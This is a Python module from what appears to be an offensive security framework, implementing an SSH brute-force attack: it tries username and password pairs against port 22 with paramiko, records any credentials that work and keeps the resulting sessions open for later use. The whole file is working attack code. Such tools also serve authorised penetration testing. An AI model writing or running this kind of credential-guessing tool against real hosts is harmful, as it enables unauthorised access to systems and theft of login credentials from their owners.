from jframework.modules.login._bruteforce import _Bruteforce
import sys, time
hasParamiko = True
try:
    import paramiko
except:
    print("✕ It's required install paramiko module to run sshbruteforce")
    hasParamiko = False


class Sshbruteforce(_Bruteforce):

    def __init__(self):
        super(Sshbruteforce, self).__init__()
        self.single_port = 22

    def worker(self, user, password):
        time.sleep(1)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=self.host, port=self.single_port, username=user, password=password)
            self.print_result(user, password, error=False)
            self.lock.acquire()
            self.add_credential(user, password, "ssh")
            self.add_session(client, user, "ssh")
            self.lock.release()
        except Exception as e:
            if "is not subscriptable" in str(e):
                print("No SSH service")
                self.num_threads -= 1
                self.error += 1
                sys.exit(0)
            if(self.verb):
               self.print_result(user,password, error=True)
            try:
                client.close()
            except:
                pass
        self.num_threads -= 1
        sys.exit(0)

    def run(self):
        if (not hasParamiko):
            print("✕  It's required install paramiko")
            return

        super(Sshbruteforce, self).run()
        return self.sessions, self.credentials